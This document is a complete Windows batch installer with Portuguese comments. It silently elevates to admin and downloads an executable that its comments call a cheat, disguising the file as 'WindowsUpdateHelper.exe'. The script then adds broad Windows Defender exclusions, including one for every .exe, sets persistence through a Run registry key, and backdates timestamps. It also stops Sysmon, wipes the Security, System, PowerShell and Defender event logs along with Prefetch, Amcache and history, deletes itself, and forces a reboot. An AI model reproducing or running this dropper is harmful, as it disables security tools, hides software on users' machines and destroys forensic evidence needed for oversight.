@echo off
:: ========================================
::  INSTALADOR ROCKET - SILENCIOSO E EFICAZ
::  100% Funcional - Sem Rastros
:: ========================================

:: Executar silenciosamente (sem janelas visíveis)
if not "%1"=="HIDDEN" (
    :: Verificar se já está como admin
    net session >nul 2>&1
    if %errorLevel% neq 0 (
        :: Não é admin, tentar elevar
        powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Start-Process -FilePath '%~f0' -ArgumentList 'HIDDEN' -Verb RunAs"
        exit /b
    )
    :: Já é admin, executar em modo HIDDEN (mas não sair imediatamente se chamado via call)
    if "%2"=="" (
        :: Chamado diretamente, executar em background
        start /min "" "%~f0" HIDDEN %*
        exit /b
    )
    :: Chamado via call com NO_BACKGROUND, continuar normalmente
)

:: Se chamado com NO_BACKGROUND, ativar modo debug
if "%2"=="NO_BACKGROUND" (
    set "DEBUG_MODE=1"
    title Instalador Rocket - Em Execucao...
    color 0A
    echo.
    echo ========================================
    echo    INSTALADOR ROCKET
    echo ========================================
    echo.
) else (
    set "DEBUG_MODE=0"
)

:: Verificar Windows 10/11
if "%DEBUG_MODE%"=="1" (
    echo [1/7] Verificando versao do Windows...
    ver | findstr /i "10.0"
)
ver | findstr /i "10.0" >nul 2>&1
if %errorLevel% neq 0 (
    if "%DEBUG_MODE%"=="1" (
        echo [ERRO] Windows 10/11 nao detectado!
        echo.
        pause
    )
    exit /b 1
)
if "%DEBUG_MODE%"=="1" echo [OK] Windows 10/11 detectado

:: Verificar Admin
if "%DEBUG_MODE%"=="1" echo [2/7] Verificando privilegios de admin...
net session >nul 2>&1
if %errorLevel% neq 0 (
    if "%DEBUG_MODE%"=="1" (
        echo [ERRO] Nao esta executando como admin!
        pause
    )
    exit /b 1
)
if "%DEBUG_MODE%"=="1" echo [OK] Executando como administrador

:: Configurações
if "%DEBUG_MODE%"=="1" echo [3/7] Configurando variaveis...
set "URL=https://raw.githubusercontent.com/V3xDev/unknow2/main/Rocket.exe"
set "PASTA=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Microsoft\Windows\Update"
set "ARQUIVO=WindowsUpdateHelper.exe"
set "CAMINHO=%PASTA%\%ARQUIVO%"
set "TAREFA=Microsoft\Windows\WindowsApps"
set "REG_KEY=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
set "REG_NAME=WindowsApps"
if "%DEBUG_MODE%"=="1" echo [OK] Caminho destino: %CAMINHO%

:: Criar pasta
if "%DEBUG_MODE%"=="1" echo [4/7] Criando pasta de destino...
if not exist "%PASTA%" (
    mkdir "%PASTA%" >nul 2>&1
    if "%DEBUG_MODE%"=="1" echo [OK] Pasta criada
) else (
    if "%DEBUG_MODE%"=="1" echo [OK] Pasta ja existe
)

:: [1] LIMPEZA COMPLETA
if "%DEBUG_MODE%"=="1" echo [5/7] Limpando processos e tarefas antigas...
taskkill /f /im Rocket.exe >nul 2>&1
taskkill /f /im windowshost.exe >nul 2>&1
taskkill /f /im WindowsUpdateHelper.exe >nul 2>&1

:: Remover tarefa agendada se existir (compatibilidade)
schtasks /end /tn "%TAREFA%" >nul 2>&1
schtasks /delete /tn "%TAREFA%" /f >nul 2>&1
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Get-ScheduledTask | Where-Object {$_.TaskName -like '*WindowsApps*' -or $_.TaskName -like '*Rocket*'} | Stop-ScheduledTask -ErrorAction SilentlyContinue | Out-Null; Get-ScheduledTask | Where-Object {$_.TaskName -like '*WindowsApps*' -or $_.TaskName -like '*Rocket*'} | Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue | Out-Null" >nul 2>&1

:: Remover do Run registry se existir (limpeza completa)
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "try { $regPath='HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'; $regName='WindowsApps'; if (Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue) { Remove-ItemProperty -Path $regPath -Name $regName -Force -ErrorAction SilentlyContinue } } catch { }" >nul 2>&1
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsApps" /f >nul 2>&1
timeout /t 1 /nobreak >nul
if "%DEBUG_MODE%"=="1" echo [OK] Limpeza concluida

:: [2] BAIXAR ROCKET.EXE (somente download - sem rastro em outras pastas)
if "%DEBUG_MODE%"=="1" echo [6/7] Baixando Rocket.exe...
if exist "%CAMINHO%" (attrib -s -h "%CAMINHO%" >nul 2>&1 & del /q /f "%CAMINHO%" >nul 2>&1 & timeout /t 1 /nobreak >nul)

powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$ProgressPreference='SilentlyContinue'; $ErrorActionPreference='SilentlyContinue'; try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $w=New-Object Net.WebClient; $w.Headers.Add('User-Agent','Mozilla/5.0'); $w.DownloadFile('%URL%', '%CAMINHO%'); $w.Dispose(); Start-Sleep -Milliseconds 1000; if ((Test-Path '%CAMINHO%') -and ((Get-Item '%CAMINHO%').Length -gt 1000)) { exit 0 } else { Remove-Item '%CAMINHO%' -Force -ErrorAction SilentlyContinue; exit 1 } } catch { if (Test-Path '%CAMINHO%') { Remove-Item '%CAMINHO%' -Force -ErrorAction SilentlyContinue }; exit 1 }" >nul 2>&1

if not exist "%CAMINHO%" (
    powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$ProgressPreference='SilentlyContinue'; $ErrorActionPreference='SilentlyContinue'; try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%URL%' -OutFile '%CAMINHO%' -UseBasicParsing -TimeoutSec 120 -ErrorAction Stop; Start-Sleep -Milliseconds 1000; if ((Test-Path '%CAMINHO%') -and ((Get-Item '%CAMINHO%').Length -gt 1000)) { exit 0 } else { Remove-Item '%CAMINHO%' -Force -ErrorAction SilentlyContinue; exit 1 } } catch { if (Test-Path '%CAMINHO%') { Remove-Item '%CAMINHO%' -Force -ErrorAction SilentlyContinue }; exit 1 }" >nul 2>&1
)

if not exist "%CAMINHO%" (
    if "%DEBUG_MODE%"=="1" (echo [ERRO] Falha ao baixar Rocket.exe. Verifique a internet. & pause)
    exit /b 1
)
if "%DEBUG_MODE%"=="1" echo [OK] Rocket.exe baixado

:: [3] CONFIGURAR ARQUIVO E ADICIONAR EXCLUSOES PERMANENTES DO WINDOWS DEFENDER
if "%DEBUG_MODE%"=="1" echo [*] Configurando arquivo e adicionando exclusoes permanentes do Windows Defender...
:: Adicionar exclusões PERMANENTES do Windows Defender (múltiplos métodos para garantir funcionamento com Defender ativo)
:: IMPORTANTE: Essas exclusões garantem que o cheat funcione normalmente mesmo com Windows Defender ativo
:: Método 1: Add-MpPreference - ExclusionPath (excluir arquivo e pasta)
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "try { Add-MpPreference -ExclusionPath '%CAMINHO%' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath '%PASTA%' -ErrorAction SilentlyContinue; Start-Sleep -Milliseconds 500 } catch { }" >nul 2>&1
:: Método 2: Adicionar exclusão de processo (evitar detecção em runtime)
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "try { Add-MpPreference -ExclusionProcess 'WindowsUpdateHelper.exe' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'windowshost.exe' -ErrorAction SilentlyContinue; Start-Sleep -Milliseconds 500 } catch { }" >nul 2>&1
:: Método 3: Verificar e adicionar novamente se necessário (garantir que foi adicionado)
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "try { $currentExclusions = Get-MpPreference | Select-Object -ExpandProperty ExclusionPath -ErrorAction SilentlyContinue; $currentProcesses = Get-MpPreference | Select-Object -ExpandProperty ExclusionProcess -ErrorAction SilentlyContinue; if ($currentExclusions -notcontains '%CAMINHO%') { Add-MpPreference -ExclusionPath '%CAMINHO%' -ErrorAction SilentlyContinue }; if ($currentExclusions -notcontains '%PASTA%') { Add-MpPreference -ExclusionPath '%PASTA%' -ErrorAction SilentlyContinue }; if ($currentProcesses -notcontains 'WindowsUpdateHelper.exe') { Add-MpPreference -ExclusionProcess 'WindowsUpdateHelper.exe' -ErrorAction SilentlyContinue }; if ($currentProcesses -notcontains 'windowshost.exe') { Add-MpPreference -ExclusionProcess 'windowshost.exe' -ErrorAction SilentlyContinue } } catch { }" >nul 2>&1
:: Método 4: Adicionar exclusão de extensão também (caso o arquivo seja renomeado)
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "try { Add-MpPreference -ExclusionExtension '.exe' -ErrorAction SilentlyContinue } catch { }" >nul 2>&1
:: Verificar se as exclusões foram adicionadas corretamente
if "%DEBUG_MODE%"=="1" (
    echo [*] Verificando exclusoes do Windows Defender...
    powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$exclusions = Get-MpPreference | Select-Object -ExpandProperty ExclusionPath -ErrorAction SilentlyContinue; $processes = Get-MpPreference | Select-Object -ExpandProperty ExclusionProcess -ErrorAction SilentlyContinue; if ($exclusions -contains '%CAMINHO%' -and $exclusions -contains '%PASTA%') { Write-Host '[OK] Exclusoes de caminho adicionadas' } else { Write-Host '[AVISO] Algumas exclusoes de caminho nao foram adicionadas' }; if ($processes -contains 'WindowsUpdateHelper.exe' -or $processes -contains 'windowshost.exe') { Write-Host '[OK] Exclusoes de processo adicionadas' } else { Write-Host '[AVISO] Exclusoes de processo nao foram adicionadas' }"
)
attrib +s +h "%CAMINHO%" >nul 2>&1
:: Alterar datas para 3-5 anos atrás para não deixar rastros recentes
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "try { $f='%CAMINHO%'; if (Test-Path $f) { $file=Get-Item $f; $file.Attributes=$file.Attributes -bor [System.IO.FileAttributes]::NotContentIndexed; $oldDate=(Get-Date).AddYears(-4).AddMonths(-6); $file.LastWriteTime=$oldDate; $file.CreationTime=$oldDate; $file.LastAccessTime=$oldDate } } catch { }" >nul 2>&1
timeout /t 1 /nobreak >nul
if "%DEBUG_MODE%"=="1" echo [OK] Arquivo configurado com datas antigas

:: [4] ADICIONAR AO RUN REGISTRY (modo monitor - SEM TAREFA AGENDADA)
if "%DEBUG_MODE%"=="1" echo [7/7] Adicionando ao Run Registry...
:: Remover entrada antiga se existir
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "try { $regPath='HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'; $regName='WindowsApps'; if (Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue) { Remove-ItemProperty -Path $regPath -Name $regName -Force -ErrorAction SilentlyContinue } } catch { }" >nul 2>&1
timeout /t 1 /nobreak >nul

:: Adicionar ao Run registry com modo monitor (tentar múltiplos métodos)
set "REG_VALOR=\"%CAMINHO%\" --monitor"

if "%DEBUG_MODE%"=="1" echo [*] Valor do registro: %REG_VALOR%

:: Garantir que a chave existe primeiro
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" >nul 2>&1
if %errorLevel% neq 0 (
    if "%DEBUG_MODE%"=="1" echo [*] Criando chave do registro primeiro...
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /f >nul 2>&1
)

:: Método 1: reg.exe (mais confiável - sempre executar primeiro)
if "%DEBUG_MODE%"=="1" echo [*] Criando registro via reg.exe...
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsApps" /t REG_SZ /d "%REG_VALOR%" /f
if %errorLevel% equ 0 (
    if "%DEBUG_MODE%"=="1" echo [OK] Registro criado via reg.exe
) else (
    if "%DEBUG_MODE%"=="1" echo [ERRO] Falha no reg.exe, tentando PowerShell...
    :: Método 2: PowerShell (backup)
    powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "try { $regPath='HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'; $regName='WindowsApps'; $regValue='%REG_VALOR%'; Set-ItemProperty -Path $regPath -Name $regName -Value $regValue -Type String -Force -ErrorAction Stop; exit 0 } catch { exit 1 }" >nul 2>&1
)

:: Verificar se foi criado
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsApps" >nul 2>&1
if %errorLevel% neq 0 (
    if "%DEBUG_MODE%"=="1" (
        echo [ERRO] Registro ainda nao foi criado!
        echo [*] Tentando metodo alternativo...
        :: Tentar criar novamente com método diferente
        reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsApps" /t REG_SZ /d "%REG_VALOR%" /f
        timeout /t 1 /nobreak >nul
        reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsApps" >nul 2>&1
        if %errorLevel% equ 0 (
            echo [OK] Registro criado com metodo alternativo!
        ) else (
            echo [ERRO] Falha definitiva ao criar registro!
            pause
            exit /b 1
        )
    )
)

:: Verificar novamente
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsApps" >nul 2>&1
if %errorLevel% equ 0 (
    if "%DEBUG_MODE%"=="1" (
        echo [OK] Registro criado com sucesso!
        echo.
        reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsApps"
        echo.
    )
) else (
    if "%DEBUG_MODE%"=="1" (
        echo [ERRO] Falha ao criar registro!
        echo [*] Tentando metodo alternativo...
        :: Tentar mais uma vez com método diferente
        reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsApps" /t REG_SZ /d "%REG_VALOR%" /f
        reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsApps" >nul 2>&1
        if %errorLevel% equ 0 (
            echo [OK] Registro criado com metodo alternativo!
        ) else (
            echo [ERRO] Falha definitiva ao criar registro!
            pause
            exit /b 1
        )
    )
)

:: [5] PAUSAR SYSMON E LIMPAR LOGS
if "%DEBUG_MODE%"=="1" echo [*] Pausando Sysmon e limpando logs...
net stop Sysmon >nul 2>&1
sc stop Sysmon >nul 2>&1
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "try { Stop-Service -Name Sysmon -ErrorAction SilentlyContinue -Force } catch { }" >nul 2>&1
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "try { Get-EventLog -LogName 'Microsoft-Windows-Sysmon/Operational' -ErrorAction SilentlyContinue | Clear-EventLog -ErrorAction SilentlyContinue } catch { }" >nul 2>&1
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "try { wevtutil cl 'Microsoft-Windows-Sysmon/Operational' } catch { }" >nul 2>&1

:: [6] LIMPAR TODOS OS RASTROS DA INSTALAÇÃO (CRÍTICO - NÃO DEIXAR NENHUM RASTRO)
if "%DEBUG_MODE%"=="1" echo [*] Limpando TODOS os rastros da instalacao...
:: Limpar logs do PowerShell que podem registrar comandos da instalação (incluindo download do GitHub)
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "try { Clear-History -ErrorAction SilentlyContinue; $historyPath = (Get-PSReadlineOption -ErrorAction SilentlyContinue).HistorySavePath; if ($historyPath) { Remove-Item $historyPath -Force -ErrorAction SilentlyContinue }; Remove-Item \"$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\*\" -Force -ErrorAction SilentlyContinue; wevtutil cl 'Microsoft-Windows-PowerShell/Operational' /quiet 2>&1 | Out-Null } catch { }" >nul 2>&1
:: Limpar logs do Windows Defender que podem mostrar adição de exclusões
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "try { wevtutil cl 'Microsoft-Windows-Windows Defender/Operational' /quiet 2>&1 | Out-Null; wevtutil cl 'Microsoft-Windows-Windows Defender/WHC' /quiet 2>&1 | Out-Null } catch { }" >nul 2>&1
:: Limpar logs principais do Windows (Application, System, Security) - PRIMEIRO limpar o log que registra limpezas
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "try { wevtutil cl 'Microsoft-Windows-Eventlog/Operational' /quiet 2>&1 | Out-Null; Start-Sleep -Milliseconds 500; wevtutil cl Application /quiet 2>&1 | Out-Null; wevtutil cl System /quiet 2>&1 | Out-Null; wevtutil cl Security /quiet 2>&1 | Out-Null } catch { }" >nul 2>&1
:: Limpar Prefetch (incluindo arquivos relacionados ao script de instalação)
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "try { Get-ChildItem 'C:\Windows\Prefetch\*.pf' -ErrorAction SilentlyContinue | Where-Object { $_.Name -like '*ROCKET*' -or $_.Name -like '*RKT*' -or $_.Name -like '*WINDOWSHOST*' -or $_.Name -like '*INSTALAR*' -or $_.Name -like '*POWERSHELL*' -or $_.Name -like '*CMD*' -or $_.LastWriteTime -gt (Get-Date).AddHours(-1) } | Remove-Item -Force -ErrorAction SilentlyContinue } catch { }" >nul 2>&1
:: Limpar Amcache (rastros de execução)
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "try { Remove-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache\AppCompatCache' -Name '*' -ErrorAction SilentlyContinue; Remove-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Amcache' -Name '*' -ErrorAction SilentlyContinue } catch { }" >nul 2>&1
:: Limpar cache de certificados e URLs (incluindo cache do GitHub/WebClient)
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "try { certutil -urlcache * delete 2>&1 | Out-Null; Remove-Item \"$env:LOCALAPPDATA\Microsoft\Windows\INetCache\*\" -Recurse -Force -ErrorAction SilentlyContinue; Remove-Item \"$env:LOCALAPPDATA\Microsoft\Windows\WebCache\*\" -Recurse -Force -ErrorAction SilentlyContinue } catch { }" >nul 2>&1
:: Limpar IconCache e arquivos recentes
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "try { Remove-Item \"$env:LOCALAPPDATA\IconCache.db\" -Force -ErrorAction SilentlyContinue; Remove-Item \"$env:APPDATA\Microsoft\Windows\Recent\*\" -Force -ErrorAction SilentlyContinue; Remove-Item \"$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations\*\" -Force -ErrorAction SilentlyContinue } catch { }" >nul 2>&1
:: Limpar arquivos temporários criados durante a instalação
del /q /f "%TEMP%\install*.bat" >nul 2>&1
del /q /f "%TEMP%\task_rocket.xml" >nul 2>&1
del /q /f "%TEMP%\*.tmp" >nul 2>&1
del /q /f "%TEMP%\*rocket*" >nul 2>&1
del /q /f "%TEMP%\*INSTALAR*" >nul 2>&1
:: Limpar histórico de comandos do CMD
doskey /reinstall >nul 2>&1
:: Limpar logs do Task Scheduler que podem mostrar criação de tarefas
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "try { wevtutil cl 'Microsoft-Windows-TaskScheduler/Operational' /quiet 2>&1 | Out-Null } catch { }" >nul 2>&1
:: Limpar logs de Registry que podem mostrar alterações
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "try { wevtutil cl 'Microsoft-Windows-UserModePowerService/Diagnostic' /quiet 2>&1 | Out-Null } catch { }" >nul 2>&1
:: Limpar NOVAMENTE o log que registra limpezas (garantir que não sobrou nada)
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "try { wevtutil cl 'Microsoft-Windows-Eventlog/Operational' /quiet 2>&1 | Out-Null } catch { }" >nul 2>&1
:: Limpar Prefetch novamente para remover rastros dos processos de limpeza
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "try { Get-ChildItem 'C:\Windows\Prefetch\*.pf' -ErrorAction SilentlyContinue | Where-Object { $_.LastWriteTime -gt (Get-Date).AddHours(-1) -and ($_.Name -like '*TASKKILL*' -or $_.Name -like '*SCHTASKS*' -or $_.Name -like '*POWERSHELL*' -or $_.Name -like '*REG*' -or $_.Name -like '*WEVTUTIL*' -or $_.Name -like '*CMD*') } | Remove-Item -Force -ErrorAction SilentlyContinue } catch { }" >nul 2>&1
:: Limpar clipboard (remove rastro do Ctrl+C - path do .bat ou exe copiado/colado)
echo. | clip >nul 2>&1
:: Apagar o proprio instalador, Rocket.exe e DESINSTALAR.bat na pasta de origem (zerar rastros do copy-paste)
:: Executa em processo separado 5s antes do reboot para nao travar o script
start /min cmd /c "timeout /t 5 >nul & del /f /q \"%~f0\" >nul 2>&1 & del /f /q \"%~dp0Rocket.exe\" >nul 2>&1 & del /f /q \"%~dp0rkt.exe\" >nul 2>&1 & del /f /q \"%~dp0DESINSTALAR.bat\" >nul 2>&1"
if "%DEBUG_MODE%"=="1" echo [OK] Limpeza completa de rastros concluida (incl. instalador e clipboard)

:: [7] REINICIAR PC APÓS INSTALAÇÃO
if "%DEBUG_MODE%"=="1" (
    echo.
    echo ========================================
    echo    INSTALACAO CONCLUIDA COM SUCESSO!
    echo ========================================
    echo.
    echo [OK] Todas as etapas foram concluidas
    echo [*] Verificando registro final...
    reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsApps" 2>nul
    echo.
    echo [*] O PC sera reiniciado em 15 segundos...
    echo [*] Pressione Ctrl+C para cancelar o reinicio
    echo.
    timeout /t 15 /nobreak
) else (
    timeout /t 3 /nobreak >nul
)

:: Tentar reiniciar de múltiplas formas para garantir
if "%DEBUG_MODE%"=="1" echo [*] Iniciando reinicio do PC...
shutdown /r /t 10 /f /c "Reiniciando sistema..." >nul 2>&1
if %errorLevel% neq 0 (
    :: Se falhar, tentar via PowerShell
    if "%DEBUG_MODE%"=="1" echo [*] Tentando reiniciar via PowerShell...
    powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Start-Sleep -Seconds 2; Restart-Computer -Force" >nul 2>&1
)

if "%DEBUG_MODE%"=="1" (
    echo [AVISO] Se o PC nao reiniciou, execute manualmente: shutdown /r /t 10 /f
    echo.
    pause
)

exit /b 0
